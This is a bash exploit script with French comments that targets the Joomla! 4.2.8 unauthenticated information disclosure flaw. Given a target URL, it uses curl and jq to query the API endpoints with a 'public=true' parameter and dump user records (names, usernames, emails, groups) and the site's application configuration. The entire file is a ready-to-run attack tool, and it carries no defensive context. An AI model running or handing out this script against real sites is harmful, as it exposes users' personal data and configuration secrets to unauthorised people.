!/bin/bash

# Exploit: Joomla! v4.2.8 - Unauthenticated information disclosure
# Remplacer par l'URL de base de votre cible Joomla!
BASE_URL="$1"

# Vérification des arguments
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

# Fonction pour récupérer les utilisateurs
fetch_users() {
    curl -s "$BASE_URL/api/index.php/v1/users?public=true" | jq '.data[] | select(.type == "users") | {id: .attributes.id, name: .attributes.name, username: .attributes.username, email: .attributes.email, groups: .attributes.group_names}'
}

# Fonction pour récupérer la configuration
fetch_config() {
    curl -s "$BASE_URL/api/index.php/v1/config/application?public=true" | jq '.data[] | select(.type == "application") | .attributes'
}

# Affichage des utilisateurs
echo "Users:"
fetch_users

# Affichage de la configuration
echo "Configuration:"
fetch_config
